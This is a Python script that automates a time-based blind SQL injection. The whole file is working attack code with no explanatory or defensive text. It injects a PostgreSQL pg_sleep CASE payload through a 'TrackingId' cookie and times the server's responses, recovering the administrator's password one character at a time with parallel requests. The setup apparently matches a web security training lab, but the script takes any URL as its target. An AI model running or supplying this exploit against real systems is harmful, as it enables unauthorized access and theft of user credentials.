import requests
import time
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

# Constant parameters
username = 'administrator'
cookie_name = 'TrackingId'

url = input('[+] Enter Page URL: ')
cookie_value = input('Enter Cookie Value(Optional): ')

# Character set to test (a-z and 0-9)
character_set = string.ascii_lowercase + string.digits


# Function to send the request and check the response time
def send_request(character, position, session):
    # SQL injection payload
    payload = f"{cookie_value}' || (SELECT CASE WHEN (username='{username}' AND SUBSTRING(password,{position},1)='{character}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)-- "
    cookies = {cookie_name: payload}
    start_time = time.time()
    session.get(url, cookies=cookies)
    response_time = time.time() - start_time

    return character, response_time >= 10  # 10 seconds threshold


# Function to find the password
def find_password(url):
    found_password = ''
    session = requests.Session()  # Reuse the session for faster connections

    for position in range(1, 21):  # Iterate through each position in the 20-character password
        correct_character_found = False
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(send_request, character, position, session): character for character in
                       character_set}
            for future in as_completed(futures):
                character, is_correct = future.result()
                if is_correct:
                    found_password += character
                    print(f'[+] Found Character {position}: {character}')
                    correct_character_found = True
                    break
        if not correct_character_found:
            print(f'[-] No correct character found for position {position}.')

    print(f'[+] Found Password: ==> {found_password}')


# Start the password guessing process
find_password(url)
